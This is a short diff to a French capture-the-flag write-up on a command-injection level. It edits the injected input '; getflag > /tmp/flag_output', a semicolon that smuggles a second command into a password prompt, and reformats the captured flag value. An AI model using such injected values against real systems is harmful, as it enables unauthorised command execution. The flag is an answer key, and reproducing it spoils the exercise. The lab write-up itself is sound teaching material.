@@ -25,7 +25,7 @@ Nous allons injecter une commande pour exécuter `getflag` et rediriger la sorti
 
 2. **Injecter la commande malveillante** :
    ```
-   Password: ; getflag > /tmp/flag_output
+   ; getflag > /tmp/flag_output
    ```
 
 3. **Lire le fichier contenant le mot de passe** :
@@ -46,8 +46,9 @@ Password: ; getflag > /tmp/flag_output
 cat /tmp/flag_output
 ```
 
-**Sortie:
+**Sortie attendue :**
+```
 fa6v5ateaw21peobuub8ipe6s
-**
+```
 
 En exécutant ces étapes, nous exploitons l'injection de commande pour obtenir le mot de passe du niveau suivant.
